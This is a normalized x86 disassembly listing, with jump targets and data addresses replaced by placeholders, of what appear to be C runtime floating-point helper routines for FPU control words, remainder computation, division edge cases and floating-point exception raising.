cmp [ ebp + 0xc ] eax
fstp st0
jne r-xdata
cmp [ ebp + 0x10 ] edx
jne r-xdata
fld1
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
cmp [ ebp + 0xc ] ecx
fstp st0
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
fld1
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
fcom st1
fnstsw ax
fstp st1
test ah 0x41
mov eax [ ebp + 0x18 ]
jne r-xdata
fstp st2
fstp st1
mov eax esi
pop esi
pop ebp
retn
cmp [ ebp + 0x8 ] edx
jne r-xdata
fstp st0
fcom [ ebp + 0x10 ]
fnstsw ax
test ah 0x5
jpo r-xdata
fstp st2
fcompp
fnstsw ax
test ah 0x5
mov eax [ ebp + 0x18 ]
jpe r-xdata
fstp st0
fstp st0
jmp r-xdata
fstp st1
jmp r-xdata
fstp st0
jmp r-xdata
mov eax [ ebp + 0x18 ]
fld [ ebp + 0x10 ]
push ecx
push ecx
fstp [ esp ]
call sub_41c1f6
fldz
pop ecx
fcom [ ebp + 0x10 ]
pop ecx
mov ecx eax
fnstsw ax
test ah 0x5
jpe r-xdata
fstp st0
fld [ rw-data ]
jmp r-xdata
fcom [ ebp + 0x10 ]
fnstsw ax
test ah 0x41
mov eax [ ebp + 0x18 ]
je r-xdata
fld [ rw-data ]
xor esi esi
fstp [ eax ]
inc esi
jmp r-xdata
fld [ rw-data ]
jmp r-xdata
fstp [ eax ]
jmp r-xdata
fcom [ ebp + 0x10 ]
fnstsw ax
test ah 0x41
jne r-xdata
cmp ecx 0x1
fstp st0
fld [ rw-data ]
jne r-xdata
fstp st0
fld1
jmp r-xdata
fstp st0
fld1
jmp r-xdata
cmp ecx 0x1
jne r-xdata
fchs
jmp r-xdata
fstp st0
fld [ rw-data ]
sub_41c3a0
fld [ esp + 0x10 ]
fld [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
or eax [ esp + 0x8 ]
jne r-xdata
xor eax 0xe000000
test eax 0xe000000
je r-xdata
mov eax [ esp + 0xc ]
and eax 0x7fff
jne r-xdata
fdivp st1
retn
shr eax 0x1c
cmp [ eax + rw-data ] 0x0
jne r-xdata
fdivp st1
retn
fnstcw [ esp + 0x1c ]
mov eax [ esp + 0x1c ]
or eax 0x33f
and eax 0xf3ff
mov [ esp + 0x20 ] eax
fldcw [ esp + 0x20 ]
mov eax [ esp + 0x18 ]
and eax 0x7fff
je r-xdata
mov eax [ esp + 0xc ]
and eax 0x7fff
je r-xdata
fdivp st1
retn
mov eax [ esp + 0x14 ]
add eax eax
jb r-xdata
cmp eax 0x7fff
je r-xdata
cmp eax 0x7fff
je r-xdata
fldcw [ esp + 0x1c ]
fdivp st1
retn
fxch st1
fstp st0
fld st0
fmul [ rw-data ]
fstp [ esp + 0x4 ]
fld [ esp + 0x10 ]
fxch st1
fwait
fldcw [ esp + 0x1c ]
jmp r-xdata
mov eax [ esp + 0x14 ]
add eax eax
jae r-xdata
fnstcw [ esp + 0x1c ]
mov eax [ esp + 0x1c ]
or eax 0x33f
and eax 0xf3ff
mov [ esp + 0x20 ] eax
fldcw [ esp + 0x20 ]
mov eax [ esp + 0x18 ]
and eax 0x7fff
cmp eax 0x1
je r-xdata
mov eax [ esp + 0x8 ]
add eax eax
jae r-xdata
jmp r-xdata
fmul [ rw-data ]
fxch st1
fmul [ rw-data ]
fxch st1
fldcw [ esp + 0x1c ]
fdivp st1
retn
fmul [ rw-data ]
fxch st1
fmul [ rw-data ]
fxch st1
fldcw [ esp + 0x1c ]
fdivp st1
retn
sub_41c5bd
add esp 0x2c
int 0x6
fxch st2
fstp [ esp + 0xc ]
fxch st1
fld st0
fstp [ esp ]
fstp [ esp + 0x20 ]
call sub_41c3a0
fxch st1
fld [ esp + 0x20 ]
add esp 0x2c
retn
sub_41c661
add esp 0x2c
int 0x6
fxch st3
fstp [ esp + 0xc ]
fxch st2
fld st0
fstp [ esp ]
fstp [ esp + 0x20 ]
call sub_41c3a0
fxch st2
fld [ esp + 0x20 ]
add esp 0x2c
retn
sub_41c705
add esp 0x2c
int 0x6
fxch st4
fstp [ esp + 0xc ]
fxch st3
fld st0
fstp [ esp ]
fstp [ esp + 0x20 ]
call sub_41c3a0
fxch st3
fld [ esp + 0x20 ]
add esp 0x2c
retn
sub_41c7a9
add esp 0x2c
int 0x6
fxch st5
fstp [ esp + 0xc ]
fxch st4
fld st0
fstp [ esp ]
fstp [ esp + 0x20 ]
call sub_41c3a0
fxch st4
fld [ esp + 0x20 ]
add esp 0x2c
retn
sub_41c84d
add esp 0x2c
int 0x6
fxch st6
fstp [ esp + 0xc ]
fxch st5
fld st0
fstp [ esp ]
fstp [ esp + 0x20 ]
call sub_41c3a0
fxch st5
fld [ esp + 0x20 ]
add esp 0x2c
retn
sub_41c8f1
add esp 0x2c
int 0x6
fxch st7
fstp [ esp + 0xc ]
fxch st6
fld st0
fstp [ esp ]
fstp [ esp + 0x20 ]
call sub_41c3a0
fxch st6
fld [ esp + 0x20 ]
add esp 0x2c
retn
sub_41c97c
push eax
mov eax [ esp + 0x8 ]
and eax 0x7f800000
cmp eax 0x7f800000
je r-xdata
fdiv [ esp + 0x8 ]
pop eax
retn 0x4
fnstsw ax
and eax 0x3800
je r-xdata
fxch st1
sub esp 0xc
fstp [ esp ]
fld [ esp + 0x14 ]
call sub_41c956
fld [ esp ]
fxch st1
add esp 0xc
pop eax
retn 0x4
fld [ esp + 0x8 ]
call sub_41c956
pop eax
retn 0x4
sub_41c9c8
push eax
mov eax [ esp + 0xc ]
and eax 0x7ff00000
cmp eax 0x7ff00000
je r-xdata
fdiv [ esp + 0x8 ]
pop eax
retn 0x8
fnstsw ax
and eax 0x3800
je r-xdata
fxch st1
sub esp 0xc
fstp [ esp ]
fld [ esp + 0x14 ]
call sub_41c956
fld [ esp ]
fxch st1
add esp 0xc
pop eax
retn 0x8
fld [ esp + 0x8 ]
call sub_41c956
pop eax
retn 0x8
sub_41ca14
push eax
fnstsw ax
and eax 0x3800
je r-xdata
fxch st1
sub esp 0xc
fstp [ esp ]
fild [ esp + 0x14 ]
call sub_41c956
fld [ esp ]
fxch st1
add esp 0xc
pop eax
retn 0x4
fild [ esp + 0x8 ]
call sub_41c956
pop eax
retn 0x4
sub_41ca48
push eax
fnstsw ax
and eax 0x3800
je r-xdata
fxch st1
sub esp 0xc
fstp [ esp ]
fild [ esp + 0x14 ]
call sub_41c956
fld [ esp ]
fxch st1
add esp 0xc
pop eax
retn 0x4
fild [ esp + 0x8 ]
call sub_41c956
pop eax
retn 0x4
sub_41ca7c
push eax
mov eax [ esp + 0x8 ]
and eax 0x7f800000
cmp eax 0x7f800000
je r-xdata
fdivr [ esp + 0x8 ]
pop eax
retn 0x4
fnstsw ax
and eax 0x3800
je r-xdata
fxch st1
sub esp 0xc
fstp [ esp ]
fld [ esp + 0x14 ]
call sub_41c969
fld [ esp ]
fxch st1
add esp 0xc
pop eax
retn 0x4
fld [ esp + 0x8 ]
call sub_41c969
pop eax
retn 0x4
sub_41cac8
push eax
mov eax [ esp + 0xc ]
and eax 0x7ff00000
cmp eax 0x7ff00000
je r-xdata
fdivr [ esp + 0x8 ]
pop eax
retn 0x8
fnstsw ax
and eax 0x3800
je r-xdata
fxch st1
sub esp 0xc
fstp [ esp ]
fld [ esp + 0x14 ]
call sub_41c969
fld [ esp ]
fxch st1
add esp 0xc
pop eax
retn 0x8
fld [ esp + 0x8 ]
call sub_41c969
pop eax
retn 0x8
sub_41cb14
push eax
fnstsw ax
and eax 0x3800
je r-xdata
fxch st1
sub esp 0xc
fstp [ esp ]
fild [ esp + 0x14 ]
call sub_41c969
fld [ esp ]
fxch st1
add esp 0xc
pop eax
retn 0x4
fild [ esp + 0x8 ]
call sub_41c969
pop eax
retn 0x4
sub_41cb48
push eax
fnstsw ax
and eax 0x3800
je r-xdata
fxch st1
sub esp 0xc
fstp [ esp ]
fild [ esp + 0x14 ]
call sub_41c969
fld [ esp ]
fxch st1
add esp 0xc
pop eax
retn 0x4
fild [ esp + 0x8 ]
call sub_41c969
pop eax
retn 0x4
sub_41cba6
push eax
push ebx
push ecx
mov eax [ esp + 0x16 ]
xor eax 0x700
test eax 0x700
jne r-xdata
fld [ esp + 0x10 ]
fld [ esp + 0x28 ]
fprem
shr eax 0xb
and eax 0xf
cmp [ eax + rw-data ] 0x0
je r-xdata
pop ecx
pop ebx
pop eax
retn
fnstsw [ esp + 0x3c ]
test edx 0x1
je r-xdata
mov eax [ esp + 0x16 ]
and eax 0x7fff0000
cmp eax 0x7fff0000
je r-xdata
mov eax [ esp + 0x3c ]
fxch st1
fstp st0
fld [ esp + 0x1c ]
fxch st1
and eax 0x4300
sub esp 0x1c
fnstenv [ esp ]
and [ esp + 0x4 ] 0xbcff
or [ esp + 0x4 ] eax
fldenv [ esp ]
add esp 0x1c
fnstcw [ esp + 0x34 ]
mov eax [ esp + 0x34 ]
or eax 0x300
mov [ esp + 0x38 ] eax
fldcw [ esp + 0x38 ]
fmul [ rw-data ]
fldcw [ esp + 0x34 ]
mov eax [ esp + 0x2e ]
and eax 0x7fff0000
je r-xdata
cmp eax 0x7fff0000
je r-xdata
mov eax [ esp + 0x2c ]
add eax eax
jne r-xdata
mov eax [ esp + 0x14 ]
add eax eax
jne r-xdata
mov eax [ esp + 0x18 ]
and eax 0x7fff
add eax 0x3f
mov ebx [ esp + 0x30 ]
and ebx 0x7fff
sub ebx eax
ja r-xdata
test edx 0x2
jne r-xdata
mov eax [ esp + 0x18 ]
and eax 0x7fff
add eax 0xa
mov ebx [ esp + 0x30 ]
and ebx 0x7fff
sub ebx eax
js r-xdata
fnstcw [ esp + 0x34 ]
mov eax [ esp + 0x34 ]
or eax 0x33f
mov [ esp + 0x38 ] eax
fldcw [ esp + 0x38 ]
mov eax [ esp + 0x18 ]
and eax 0x7fff
mov ebx [ esp + 0x30 ]
and ebx 0x7fff
sub ebx eax
and ebx 0x3f
or ebx 0x20
add ebx 0x1
mov ecx ebx
mov eax [ esp + 0x18 ]
mov ebx [ esp + 0x30 ]
and ebx 0x7fff
and eax 0x8000
or ebx eax
mov [ esp + 0x18 ] ebx
fld [ esp + 0x10 ]
fabs
fld [ esp + 0x28 ]
fabs
fld [ esp + 0x10 ]
fstp [ esp + 0x1c ]
fld [ esp + 0x28 ]
mov eax [ esp + 0x18 ]
mov ebx [ esp + 0x30 ]
and ebx 0x7fff
mov ecx ebx
sub ebx eax
and ebx 0x7
or ebx 0x4
sub ecx ebx
mov ebx eax
and ebx 0x8000
or ecx ebx
mov [ esp + 0x18 ] ecx
fld [ esp + 0x10 ]
mov [ esp + 0x18 ] eax
fxch st1
fprem
fstp [ esp + 0x28 ]
fstp st0
jmp r-xdata
fxch st1
fmul [ rw-data ]
fxch st1
sub ecx 0x1
jne r-xdata
fsub st1
fcom st1
fnstsw ax
and eax 0x100
jne r-xdata
mov ebx [ esp + 0x30 ]
fstp [ esp + 0x28 ]
fstp st0
fld [ esp + 0x1c ]
fld [ rw-data ]
fprem
fstp st0
fld [ esp + 0x28 ]
fldcw [ esp + 0x34 ]
and ebx 0x8000
je r-xdata
test edx 0x3
je r-xdata
fchs
jmp r-xdata
sub_41cdac
push edx
sub esp 0x30
fstp [ esp + 0x18 ]
fstp [ esp ]
xor edx edx
mov eax [ esp + 0x6 ]
test eax 0x7fff0000
je r-xdata
fld [ esp ]
fld [ esp + 0x18 ]
mov eax [ esp ]
or eax [ esp + 0x4 ]
je r-xdata
call sub_41cba6
add esp 0x30
pop edx
retn
fprem
add esp 0x30
pop edx
retn
fxch st1
fstp [ esp + 0xc ]
fld [ esp ]
fxch st1
or edx 0x2
fnstcw [ esp + 0x24 ]
mov eax [ esp + 0x24 ]
or eax 0x33f
mov [ esp + 0x28 ] eax
fldcw [ esp + 0x28 ]
mov eax [ esp + 0x20 ]
and eax 0x7fff
cmp eax 0x7fbe
ja r-xdata
fnstcw [ esp + 0x24 ]
mov eax [ esp + 0x24 ]
or eax 0x300
mov [ esp + 0x28 ] eax
fldcw [ esp + 0x28 ]
fstp st0
fmul [ rw-data ]
fstp [ esp ]
or edx 0x1
fmul [ rw-data ]
fstp [ esp + 0x18 ]
fmul [ rw-data ]
fstp [ esp ]
jmp r-xdata
fldcw [ esp + 0x24 ]
call sub_41cba6
add esp 0x30
pop edx
retn
sub_41ce5e
push eax
push ebx
push ecx
mov eax [ esp + 0x16 ]
xor eax 0x700
test eax 0x700
jne r-xdata
fld [ esp + 0x10 ]
fld [ esp + 0x28 ]
fprem1
shr eax 0xb
and eax 0xf
cmp [ eax + rw-data ] 0x0
je r-xdata
pop ecx
pop ebx
pop eax
retn
fnstsw [ esp + 0x3c ]
test edx 0x1
je r-xdata
mov eax [ esp + 0x16 ]
and eax 0x7fff0000
cmp eax 0x7fff0000
je r-xdata
mov eax [ esp + 0x3c ]
fxch st1
fstp st0
fld [ esp + 0x1c ]
fxch st1
and eax 0x4300
sub esp 0x1c
fnstenv [ esp ]
and [ esp + 0x4 ] 0xbcff
or [ esp + 0x4 ] eax
fldenv [ esp ]
add esp 0x1c
fnstcw [ esp + 0x34 ]
mov eax [ esp + 0x34 ]
or eax 0x300
mov [ esp + 0x38 ] eax
fldcw [ esp + 0x38 ]
fmul [ rw-data ]
fldcw [ esp + 0x34 ]
mov eax [ esp + 0x2e ]
and eax 0x7fff0000
je r-xdata
cmp eax 0x7fff0000
je r-xdata
mov eax [ esp + 0x2c ]
add eax eax
jne r-xdata
mov eax [ esp + 0x14 ]
add eax eax
jne r-xdata
mov eax [ esp + 0x18 ]
and eax 0x7fff
add eax 0x3f
mov ebx [ esp + 0x30 ]
and ebx 0x7fff
sub ebx eax
ja r-xdata
test ebx 0x2
jne r-xdata
mov eax [ esp + 0x18 ]
and eax 0x7fff
add eax 0xa
mov ebx [ esp + 0x30 ]
and ebx 0x7fff
sub ebx eax
js r-xdata
fnstcw [ esp + 0x34 ]
mov eax [ esp + 0x34 ]
or eax 0x33f
mov [ esp + 0x38 ] eax
fldcw [ esp + 0x38 ]
mov eax [ esp + 0x18 ]
and eax 0x7fff
mov ebx [ esp + 0x30 ]
and ebx 0x7fff
sub ebx eax
and ebx 0x3f
or ebx 0x20
add ebx 0x1
mov ecx ebx
mov eax [ esp + 0x18 ]
mov ebx [ esp + 0x30 ]
and ebx 0x7fff
and eax 0x8000
or ebx eax
mov [ esp + 0x18 ] ebx
fld [ esp + 0x10 ]
fabs
fld [ esp + 0x28 ]
fabs
fld [ esp + 0x10 ]
fstp [ esp + 0x1c ]
fld [ esp + 0x28 ]
mov eax [ esp + 0x18 ]
mov ebx [ esp + 0x30 ]
and ebx 0x7fff
mov ecx ebx
sub ebx eax
and ebx 0x7
or ebx 0x4
sub ecx ebx
mov ebx eax
and ebx 0x8000
or ecx ebx
mov [ esp + 0x18 ] ecx
fld [ esp + 0x10 ]
mov [ esp + 0x18 ] eax
fxch st1
fprem
fstp [ esp + 0x28 ]
fstp st0
jmp r-xdata
fxch st1
fmul [ rw-data ]
fxch st1
sub ecx 0x1
jne r-xdata
fsub st1
fcom st1
fnstsw ax
and eax 0x100
jne r-xdata
mov ebx [ esp + 0x30 ]
fstp [ esp + 0x28 ]
fstp st0
fld [ esp + 0x1c ]
fld [ rw-data ]
fprem1
fstp st0
fld [ esp + 0x28 ]
fldcw [ esp + 0x34 ]
and ebx 0x8000
je r-xdata
test edx 0x3
je r-xdata
fchs
jmp r-xdata
sub_41d064
push edx
sub esp 0x30
fstp [ esp + 0x18 ]
fstp [ esp ]
mov edx 0x0
mov eax [ esp + 0x6 ]
test eax 0x7fff0000
je r-xdata
fld [ esp ]
fld [ esp + 0x18 ]
mov eax [ esp ]
or eax [ esp + 0x4 ]
je r-xdata
call sub_41ce5e
add esp 0x30
pop edx
retn
fprem
add esp 0x30
pop edx
retn
fxch st1
fstp [ esp + 0xc ]
fld [ esp ]
fxch st1
or edx 0x2
fnstcw [ esp + 0x24 ]
mov eax [ esp + 0x24 ]
or eax 0x33f
mov [ esp + 0x28 ] eax
fldcw [ esp + 0x28 ]
mov eax [ esp + 0x20 ]
and eax 0x7fff
cmp eax 0x7fbe
ja r-xdata
fnstcw [ esp + 0x24 ]
mov eax [ esp + 0x24 ]
or eax 0x300
mov [ esp + 0x28 ] eax
fldcw [ esp + 0x28 ]
fstp st0
fmul [ rw-data ]
fstp [ esp ]
or edx 0x1
fmul [ rw-data ]
fstp [ esp + 0x18 ]
fmul [ rw-data ]
fstp [ esp ]
jmp r-xdata
fldcw [ esp + 0x24 ]
call sub_41ce5e
add esp 0x30
pop edx
retn
sub_41d12b
push ebp
mov ebp esp
and esp 0xfffffff0
sub esp 0x84
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x80 ] eax
mov eax [ ebp + 0x10 ]
movzx ecx [ eax ]
push ebx
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi ]
dec eax
push edi
mov [ esp + 0xc ] ecx
je r-xdata
push 0x8
dec eax
je r-xdata
push 0xffff
push [ esp + 0x10 ]
call sub_41da62
cmp [ esi ] 0x8
pop ecx
pop ecx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x10
je r-xdata
push 0x4
jmp r-xdata
dec eax
je r-xdata
push [ esi ]
call sub_41d706
pop ecx
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx [ esp + 0x50 ]
fld [ esi + 0x10 ]
and ecx 0xffffffe3
fstp [ esp + 0x40 ]
or ecx 0x3
mov [ esp + 0x50 ] ecx
cmp eax 0x16
je r-xdata
pop ebx
push ecx
lea edi [ esi + 0x18 ]
push edi
push ebx
call sub_41d525
add esp 0xc
test eax eax
jne r-xdata
push 0x11
jmp r-xdata
dec eax
je r-xdata
push esi
call sub_41d227
test eax eax
pop ecx
jne r-xdata
cmp eax 0x1d
je r-xdata
push 0x12
jmp r-xdata
dec eax
je r-xdata
mov ecx [ esp + 0x8c ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_413965
mov esp ebp
pop ebp
retn
and [ esp + 0x50 ] 0xfffffffe
jmp r-xdata
dec eax
dec eax
je r-xdata
push edi
lea ecx [ esi + 0x8 ]
push ecx
push eax
push ebx
lea eax [ esp + 0x1c ]
push eax
lea eax [ esp + 0x24 ]
push eax
call sub_41d504
add esp 0x18
mov [ esi ] 0x1
jmp r-xdata
dec eax
jne r-xdata
push 0x10
jmp r-xdata
sub_41d22a
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cl [ ebp + 0x10 ]
push ebx
push esi
push edi
xor edi edi
mov [ eax + 0x4 ] edi
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ eax + 0x8 ] edi
mov eax [ ebp + 0x8 ]
inc ebx
test cl 0x10
mov [ eax + 0xc ] edi
je r-xdata
test cl 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] ebx
mov [ ebp + 0x10 ] 0xc000008f
test bl cl
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x2
mov [ ebp + 0x10 ] 0xc0000093
test cl 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x4
mov [ ebp + 0x10 ] 0xc0000091
test cl 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x8
mov [ ebp + 0x10 ] 0xc000008e
mov esi [ ebp + 0xc ]
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shl ecx 0x4
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x10
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
add ecx ecx
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x8
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shr ecx 0x1
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x4
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shr ecx 0x3
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x2
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shr ecx 0x5
not ecx
xor ecx [ eax + 0x8 ]
and ecx ebx
xor [ eax + 0x8 ] ecx
call sub_41da4b
test bl al
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x10
mov [ ebp + 0x10 ] 0xc0000090
test al 0x4
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x10
test al 0x8
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x8
test al 0x10
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x4
test al 0x20
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x2
mov eax [ esi ]
mov ecx 0xc00
and eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] ebx
mov eax [ ebp + 0x8 ]
and [ eax ] 0xfffffffc
cmp eax 0x400
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xffffffeb
or ecx 0x8
cmp eax 0x200
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xfffffffd
or ecx ebx
jmp r-xdata
cmp eax 0x800
je r-xdata
mov ecx [ eax + 0x20 ]
and ecx 0xffffffe3
or ecx 0x2
mov [ eax + 0x20 ] ecx
mov eax [ ebp + 0x18 ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
or [ eax + 0x60 ] ebx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x60 ]
and ecx 0xffffffe3
or ecx 0x2
mov [ eax + 0x60 ] ecx
fld [ edi ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x50 ]
and [ eax + 0x20 ] 0xffffffe1
mov eax [ ebp + 0x18 ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
or [ eax + 0x60 ] ebx
mov eax [ ebp + 0x8 ]
and [ eax + 0x60 ] 0xffffffe1
fld [ edi ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x50 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xffffffe7
or ecx 0x4
jmp r-xdata
cmp eax ecx
jne r-xdata
mov [ eax ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xfffffffe
or ecx 0x2
cmp eax ecx
jne r-xdata
test [ ecx + 0x8 ] 0x8
je r-xdata
and [ esi ] 0xfffffffe
call sub_41da56
lea eax [ ebp + 0x8 ]
push eax
push ebx
push 0x0
push [ ebp + 0x10 ]
call [ RaiseException@IAT ]
mov ecx [ ebp + 0x8 ]
test [ ecx + 0x8 ] 0x10
je r-xdata
mov [ eax ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x14 ]
shl ecx 0x5
xor ecx [ eax ]
and ecx 0x1ffe0
xor [ eax ] ecx
mov eax [ ebp + 0x8 ]
or [ eax + 0x20 ] ebx
cmp [ ebp + 0x20 ] edi
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0x1c ]
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax ] 0xffffffe3
jmp r-xdata
mov eax [ esi ]
mov ecx 0x300
and eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax ] 0x3
jmp r-xdata
test [ ecx + 0x8 ] 0x4
je r-xdata
and [ esi ] 0xfffffffb
test [ ecx + 0x8 ] 0x2
je r-xdata
and [ esi ] 0xfffffff7
test [ ecx + 0x8 ] bl
je r-xdata
and [ esi ] 0xffffffef
mov eax [ ecx ]
and eax 0x3
xor ebx ebx
sub eax ebx
mov edx 0xfffff3ff
je r-xdata
and [ esi ] 0xffffffdf
and [ esi ] edx
dec eax
je r-xdata
mov eax [ esi ]
and eax edx
or eax 0x300
dec eax
je r-xdata
mov eax [ esi ]
and eax 0xfffff7ff
or eax 0x400
jmp r-xdata
dec eax
je r-xdata
fld [ ecx + 0x50 ]
fstp [ edi ]
fld [ ecx + 0x50 ]
fstp [ edi ]
jmp r-xdata
mov eax [ esi ]
and eax edx
or eax 0x200
jmp r-xdata
dec eax
jne r-xdata
mov [ esi ] eax
jmp r-xdata
mov eax [ esi ]
and eax 0xfffffbff
or eax 0x800
dec eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov [ esi ] eax
cmp [ ebp + 0x20 ] ebx
je r-xdata
and [ esi ] edx
jmp r-xdata
mov eax [ ecx ]
shr eax 0x2
and eax 0x7
sub eax ebx
je r-xdata
or [ esi ] 0xc00
jmp r-xdata
sub_41d504
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41d22a
add esp 0x1c
pop ebp
retn
sub_41d525
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0x8 ]
push ebx
push esi
xor ebx ebx
mov esi eax
and esi 0x1f
inc ebx
test al 0x8
mov [ ebp - 0x4 ] esi
je r-xdata
test al 0x4
je r-xdata
test [ ebp + 0x10 ] bl
je r-xdata
test bl al
je r-xdata
test [ ebp + 0x10 ] 0x4
je r-xdata
push ebx
call sub_41da89
pop ecx
and esi 0xfffffff7
jmp r-xdata
test al 0x2
je r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
push 0x4
call sub_41da89
pop ecx
and esi 0xfffffffb
jmp r-xdata
test [ ebp + 0x8 ] 0x10
je r-xdata
test [ ebp + 0x10 ] 0x10
je r-xdata
push 0x8
call sub_41da89
mov eax [ ebp + 0x10 ]
pop ecx
mov ecx 0xc00
and eax ecx
je r-xdata
xor eax eax
test esi esi
pop esi
sete al
pop ebx
leave
retn
test [ ebp + 0x10 ] 0x20
je r-xdata
xor esi esi
test al 0x10
je r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp eax 0x400
je r-xdata
push 0x20
call sub_41da89
pop ecx
and esi 0xffffffef
fldz
push edi
mov edi [ ebp + 0xc ]
fcomp [ edi ]
fnstsw ax
test ah 0x44
jpo r-xdata
mov esi ebx
fld [ rw-data ]
fld [ rw-data ]
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp eax 0x800
je r-xdata
mov esi ebx
fld [ edi ]
lea eax [ ebp - 0x8 ]
push eax
push ecx
push ecx
fstp [ esp ]
call sub_41d99c
mov ecx [ ebp - 0x8 ]
fstp [ ebp - 0x10 ]
add ecx 0xfffffa00
add esp 0xc
cmp ecx 0xfffffbce
jge r-xdata
fstp [ ecx ]
fld [ rw-data ]
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpo r-xdata
cmp eax ecx
jne r-xdata
and [ ebp - 0x4 ] 0xfffffffd
mov esi [ ebp - 0x4 ]
push 0x10
call sub_41da89
pop ecx
fldz
fcomp [ ebp - 0x10 ]
fnstsw ax
test ah 0x41
jne r-xdata
fld [ ebp - 0x10 ]
mov esi ebx
fmul [ r--data ]
jmp r-xdata
fld [ rw-data ]
jmp r-xdata
and esi 0xfffffffe
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
fld [ rw-data ]
test ah 0x5
jpo r-xdata
xor edx edx
mov edx ebx
jmp r-xdata
fstp [ ebp - 0x10 ]
fchs
jmp r-xdata
test edx edx
je r-xdata
sub eax ecx
movzx eax [ ebp - 0xa ]
and eax 0xf
or eax 0x10
mov [ ebp - 0xa ] ax
mov eax 0xfffffc03
cmp ecx eax
jge r-xdata
test esi esi
pop edi
je r-xdata
fld [ ebp - 0x10 ]
fstp [ edi ]
jmp r-xdata
fld [ ebp - 0x10 ]
fchs
shr [ ebp - 0x10 ] 0x1
test [ ebp - 0xc ] bl
je r-xdata
test esi esi
jne r-xdata
shr [ ebp - 0xc ] 0x1
dec eax
jne r-xdata
or [ ebp - 0x10 ] 0x80000000
mov esi ebx
test [ ebp - 0x10 ] bl
je r-xdata
sub_41d72e
mov al [ esp + 0x4 ]
test al 0x20
je r-xdata
test al 0x8
je r-xdata
push 0x5
jmp r-xdata
test al 0x4
je r-xdata
xor eax eax
inc eax
retn
pop eax
retn
test al 0x1
je r-xdata
push 0x2
jmp r-xdata
movzx eax al
and eax 0x2
add eax eax
retn
push 0x3
sub_41d75b
push ebp
mov ebp esp
sub esp 0x20
xor eax eax
mov eax [ eax * 8 + rw-data ]
jmp r-xdata
inc eax
cmp eax 0x1d
jl r-xdata
test eax eax
mov [ ebp - 0x1c ] eax
je r-xdata
mov ecx [ eax * 8 + rw-data ]
cmp ecx [ ebp + 0xc ]
je r-xdata
xor eax eax
push 0xffff
push [ ebp + 0x28 ]
call sub_41da62
push [ ebp + 0x8 ]
call sub_41d706
fld [ ebp + 0x20 ]
add esp 0xc
leave
retn
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x1c ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x24 ]
